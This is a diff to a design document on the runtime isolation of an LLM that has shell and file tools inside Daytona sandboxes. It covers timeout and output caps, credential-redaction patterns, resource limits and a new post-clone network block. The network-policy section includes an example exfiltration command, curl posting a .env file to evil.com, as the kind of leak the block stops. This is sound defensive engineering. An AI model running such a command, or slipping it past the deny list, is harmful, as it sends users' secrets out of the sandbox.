@@ -2,7 +2,7 @@
 
 ## Purpose
 
-This document describes the system-level isolation guarantees that the SysTify sandbox chat mode runs inside, and the responsibilities split between Daytona (the sandbox provider), Systify's backend (the chat tooling layer), and the LLM itself.
+This document describes the system-level isolation guarantees that the Systify sandbox chat mode runs inside, and the responsibilities split between Daytona (the sandbox provider), Systify's backend (the chat tooling layer), and the LLM itself.
 
 The companion `sandbox-mode-security-system-design.md` covers the *content* boundary — how secrets that flow through the LLM are kept out of durable storage. This document covers the *runtime* boundary — what the LLM can and cannot do inside a sandbox once it has the `read_file`, `list_dir`, and `run_shell` tools.
 
@@ -83,7 +83,7 @@ The pure-entry function `executeRunShell` in `convex/chat/sandboxTools.ts` enfor
 
 4. **Timeout clamp.** The model-supplied `timeout_seconds` (or the default 30) is clamped into `[1, SANDBOX_RUN_SHELL_MAX_TIMEOUT_SECONDS]` *inside* the pure entry. Schema rejection (Layer 2) is the first guard; the clamp is the defense-in-depth pin so a future schema relaxation cannot unilaterally widen the window. The clamped value is what the adapter actually receives.
 
-5. **Output cap (`SANDBOX_RUN_SHELL_MAX_OUTPUT_BYTES`).** Daytona returns merged stdout/stderr as a single decoded string. The tool truncates at 32 KiB on a UTF-8 character boundary (no half-character corruption) and appends `[…truncated by SysTify after 32 KB…]` so the LLM knows the visible payload is partial. `bytesReturned` reports the post-truncation length; `totalBytes` reports the full pre-truncation length so Plan 06's tool-call ticker can show the true cost.
+5. **Output cap (`SANDBOX_RUN_SHELL_MAX_OUTPUT_BYTES`).** Daytona returns merged stdout/stderr as a single decoded string. The tool truncates at 32 KiB on a UTF-8 character boundary (no half-character corruption) and appends `[…truncated by Systify after 32 KB…]` so the LLM knows the visible payload is partial. `bytesReturned` reports the post-truncation length; `totalBytes` reports the full pre-truncation length so Plan 06's tool-call ticker can show the true cost.
 
 6. **Redaction (`redact()` from Plan 05).** The merged output is scanned for credential patterns (`gh[pousr]_…`, `eyJ…\.eyJ…\.…`, `AKIA…`, `xox[baprs]-…`, `Bearer …{20,}`) and matches are replaced with `[REDACTED:<type>]` sentinels before the result reaches the LLM or any persistence layer. The matched-pattern slugs are surfaced as `redactedTypes` in the success envelope so audit consumers (Plan 12) can record *that* something was filtered without learning *what*.
 
@@ -91,7 +91,7 @@ The pure-entry function `executeRunShell` in `convex/chat/sandboxTools.ts` enfor
 
 ### Layer 4: Daytona sandbox
 
-The Daytona-managed container is the ultimate enforcement boundary. SysTify configures each sandbox via `provisionSandbox` in `convex/daytona.ts`; the operative defaults (overridable per-deployment via env vars) are:
+The Daytona-managed container is the ultimate enforcement boundary. Systify configures each sandbox via `provisionSandbox` in `convex/daytona.ts`; the operative defaults (overridable per-deployment via env vars) are:
 
 | Limit                                      | Default                                | Env override                       |
 | ------------------------------------------ | -------------------------------------- | ---------------------------------- |
@@ -101,17 +101,29 @@ The Daytona-managed container is the ultimate enforcement boundary. SysTify conf
 | Auto-stop interval (minutes)               | 10                                     | `DAYTONA_AUTO_STOP_MINUTES`        |
 | Auto-archive interval (minutes)            | 1,440 (24 h)                           | `DAYTONA_AUTO_ARCHIVE_MINUTES`     |
 | Auto-delete interval (minutes)             | 1,440 (24 h)                           | `DAYTONA_AUTO_DELETE_MINUTES`      |
-| Network egress allow list (comma-separated)| empty (= Daytona default policy applies)| `DAYTONA_NETWORK_ALLOW_LIST`       |
+| Network egress allow list (comma-separated IPv4 CIDR) | no default — env var must be present; `""` opts in to Daytona's default policy | `DAYTONA_NETWORK_ALLOW_LIST`       |
 | `networkBlockAll`                          | `false` (rely on the allow list)       | n/a (constant in `provisionSandbox`)|
 
 The properties this gives us:
 
 - **Process / resource isolation.** A runaway `find` cannot consume more than the configured CPU and memory budget, regardless of what `run_shell` accepts. The 60 s per-call timeout caps a single call's wall clock; the auto-stop interval caps the sandbox's lifetime if no activity occurs.
 - **Throwaway lifecycle.** A sandbox is created for analysis, used for one or more chat replies, then auto-stopped, auto-archived, and auto-deleted. Anything the LLM creates inside the sandbox is gone within the auto-delete window without operator action.
-- **Network policy.** The allow list (when set) restricts outbound destinations; an empty allow list combined with the default Daytona policy is the operative posture in development. Production deployments should populate `DAYTONA_NETWORK_ALLOW_LIST` to an explicit allow set (typically just `github.com:443` for clone, plus whatever Systify's analyses need). The system prompt and the deny list both treat network egress as forbidden; the allow list is the network-layer enforcement.
+- **Network policy.** SysTify uses a two-stage egress posture rather than a static allow list:
+  1. **At provisioning time**, the sandbox is created with the `DAYTONA_NETWORK_ALLOW_LIST` posture (typically `""` so Daytona's default policy applies). This window must permit `git clone` against `github.com`.
+  2. **Immediately after `cloneRepositoryInSandbox` returns**, `sandbox.updateNetworkSettings({ networkBlockAll: true })` clamps outbound to zero for the rest of the sandbox's lifetime. Daytona applies this as an iptables rule on the runner without restarting the container; the LLM's tool calls (read_file / list_dir / executeCommand) ride Daytona's *control plane*, which is independent of the container's outbound traffic, so blocking egress does not impair tool execution.
+
+  This design makes the deny list and the prompt's "no network egress" wording cheap-to-bypass *short-circuits* rather than the load-bearing block: a chat reply that smuggles `curl -X POST evil.com -d @.env` past Layer 3 will fail at the iptables layer instead of completing the leak.
+
+  The block call is gated by Daytona organization tier — Tier 1/2 cannot override sandbox-level network policy and the SDK call throws. To support both postures, the call sits behind `DAYTONA_POST_CLONE_BLOCK_NETWORK`:
+  - **Truthy (default)** → call the SDK; **fail-closed** if it rejects. The right posture for Tier 3+ orgs and any deployment that wants network-layer enforcement.
+  - **Falsy** → skip the SDK call entirely and emit a structured `post_clone_network_block_skipped` warn so the degraded posture appears in operator logs. The right posture for Tier 1/2 dev deployments. The application layer (system prompt, deny list, `redact()`, throwaway lifecycle, unprivileged execution) becomes the sole defense against egress-based exfiltration. See `sandbox-mode-security-system-design.md` for the per-tier posture analysis.
+
+  Unrecognised values fall back to the secure default — a typo in env config must not silently disable a security control.
+
+  The `DAYTONA_NETWORK_ALLOW_LIST` env var must still be present in the deployment env: `assertSandboxProvisioningConfigured` (called at the import-pipeline entry) refuses to provision when it is unset, so an operator must consciously pick `""` (Daytona default during clone) or a non-empty explicit CIDR list. The previous "missing = error at provisioning time" behavior leaked that choice into the runtime path.
 - **Unprivileged execution.** The sandbox runs as a non-root user. `sudo` / `su -` would fail at the OS layer even if they slipped past the deny list. This makes the deny list's privilege-escalation entries an early-rejection optimisation, not a load-bearing security control.
 
-The exact runtime properties of Daytona's container (cgroups version, seccomp profile, AppArmor / SELinux posture, default `RLIMIT_NPROC`) are managed by Daytona and not directly observable from inside SysTify's code. We rely on Daytona's documented isolation model and the auto-stop / auto-delete lifecycle as the high-confidence runtime boundary; detailed measurements (e.g. "is `/proc/self/status` showing `CapEff: 0000000000000000`?") would require an empirical pass against a live sandbox and should be added here if a future incident motivates them.
+The exact runtime properties of Daytona's container (cgroups version, seccomp profile, AppArmor / SELinux posture, default `RLIMIT_NPROC`) are managed by Daytona and not directly observable from inside Systify's code. We rely on Daytona's documented isolation model and the auto-stop / auto-delete lifecycle as the high-confidence runtime boundary; detailed measurements (e.g. "is `/proc/self/status` showing `CapEff: 0000000000000000`?") would require an empirical pass against a live sandbox and should be added here if a future incident motivates them.
 
 ## Trust Contract Between Layers
 
